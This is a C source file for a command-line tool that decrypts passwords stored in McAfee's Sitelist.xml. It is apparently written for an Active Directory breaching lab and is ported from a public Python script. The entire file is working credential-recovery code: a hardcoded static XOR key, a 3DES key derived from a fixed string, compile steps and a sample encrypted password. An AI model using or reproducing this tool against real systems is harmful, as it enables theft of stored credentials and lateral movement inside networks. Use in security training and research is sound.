#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/des.h>

// Constants
#define KEY_HEX "12150F10111C1A060A1F1B1817160519"
#define BLOCK_SIZE 64

/**
 * @file decrypt_mcafee.c
 * @brief McAfee Sitelist.xml password decryption tool
 * 
 * This tool decrypts passwords from McAfee's Sitelist.xml file.
 * Based on this Python code: https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/refs/heads/master/mcafee_sitelist_pwd_decrypt.py
 * breachingad - https://tryhackme.com/r/room/breachingad
 * 
 * @author Adair John Collins
 * @date December 21, 2024
 * @license MIT License
 * 
 * Compilation Instructions:
 * --------------------------
 * 1. Install OpenSSL development libraries:
 *    - For Debian-based systems (e.g., Ubuntu, Kali Linux):
 *      sudo apt-get install libssl-dev
 *    - For Red Hat-based systems (e.g., CentOS, Fedora):
 *      sudo yum install openssl-devel
 * 
 * 2. Save the C code to a file, e.g., decrypt_mcafee.c.
 * 
 * 3. Compile the code:
 *    gcc -o decrypt_mcafee decrypt_mcafee.c -lcrypto
 * 
 * 4. Run the compiled program with the base64-encoded password:
 *    ./decrypt_mcafee 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
 */

/**
 * @brief Converts a hexadecimal string to binary data.
 * 
 * @param hex The hexadecimal string.
 * @param bytes The output binary data.
 */
void hex_to_bytes(const char* hex, unsigned char* bytes) {
    for (size_t i = 0; i < strlen(hex) / 2; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

/**
 * @brief XORs input data with a predefined key.
 * 
 * @param data The input data.
 * @param data_len The length of the input data.
 * @param key The XOR key.
 * @param output The output XORed data.
 */
void xor_data(const unsigned char* data, size_t data_len, const unsigned char* key, unsigned char* output) {
    for (size_t i = 0; i < data_len; i++) {
        output[i] = data[i] ^ key[i % 16];
    }
}

/**
 * @brief Decrypts data using 3DES in ECB mode.
 * 
 * @param data The input data.
 * @param data_len The length of the input data.
 * @param key The 3DES key.
 * @param output The output decrypted data.
 */
void des3_decrypt(const unsigned char* data, size_t data_len, const unsigned char* key, unsigned char* output) {
    DES_key_schedule ks1, ks2, ks3;
    DES_cblock des_key1, des_key2, des_key3;

    memcpy(des_key1, key, 8);
    memcpy(des_key2, key + 8, 8);
    memcpy(des_key3, key + 16, 8);

    DES_set_key_unchecked(&des_key1, &ks1);
    DES_set_key_unchecked(&des_key2, &ks2);
    DES_set_key_unchecked(&des_key3, &ks3);

    for (size_t i = 0; i < data_len; i += 8) {
        DES_ecb3_encrypt((DES_cblock*)(data + i), (DES_cblock*)(output + i), &ks1, &ks2, &ks3, DES_DECRYPT);
    }
}

/**
 * @brief Generates a SHA1 digest.
 * 
 * @param input The input data.
 * @param input_len The length of the input data.
 * @param output The output SHA1 digest.
 */
void sha1_digest(const unsigned char* input, size_t input_len, unsigned char* output) {
    SHA_CTX sha_ctx;
    SHA1_Init(&sha_ctx);
    SHA1_Update(&sha_ctx, input, input_len);
    SHA1_Final(output, &sha_ctx);
}

/**
 * @brief Decodes a base64-encoded string.
 * 
 * @param input The base64-encoded string.
 * @param output The output binary data.
 * @param output_len The length of the output binary data.
 */
void base64_decode(const char* input, unsigned char* output, size_t* output_len) {
    EVP_ENCODE_CTX* ctx = EVP_ENCODE_CTX_new();
    int len;
    EVP_DecodeInit(ctx);
    EVP_DecodeUpdate(ctx, output, &len, (const unsigned char*)input, strlen(input));
    *output_len = len;
    EVP_DecodeFinal(ctx, output + len, &len);
    *output_len += len;
    EVP_ENCODE_CTX_free(ctx);
}

/**
 * @brief Main function for the McAfee Sitelist.xml password decryption tool.
 * 
 * @param argc The number of command-line arguments.
 * @param argv The command-line arguments.
 * @return int Exit status.
 */
int main(int argc, char* argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage:   %s <base64 passwd>\n", argv[0]);
        fprintf(stderr, "Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='\n", argv[0]);
        return 1;
    }

    const char* encoded_passwd = argv[1];
    unsigned char decoded_data[256];
    size_t decoded_data_len;

    // Decode the base64-encoded data
    base64_decode(encoded_passwd, decoded_data, &decoded_data_len);

    // Convert the hex key to binary
    unsigned char key[16];
    hex_to_bytes(KEY_HEX, key);

    // XOR the decoded data with the key
    unsigned char xor_data_output[256];
    xor_data(decoded_data, decoded_data_len, key, xor_data_output);

    // Generate the SHA1 digest for the key
    unsigned char sha1_key[20];
    sha1_digest((unsigned char*)"<!@#$%^>", 8, sha1_key);

    // Pad the SHA1 key to 24 bytes for 3DES
    unsigned char des_key[24];
    memcpy(des_key, sha1_key, 20);
    memset(des_key + 20, 0, 4);

    // Decrypt the XORed data using 3DES
    unsigned char decrypted_data[256] = {0};
    size_t decrypted_data_len = (decoded_data_len + 7) & ~7;
    des3_decrypt(xor_data_output, decrypted_data_len, des_key, decrypted_data);

    // Print the decrypted password
    printf("Crypted password   : %s\n", encoded_passwd);
    printf("Decrypted password : %s\n", decrypted_data);

    return 0;
}
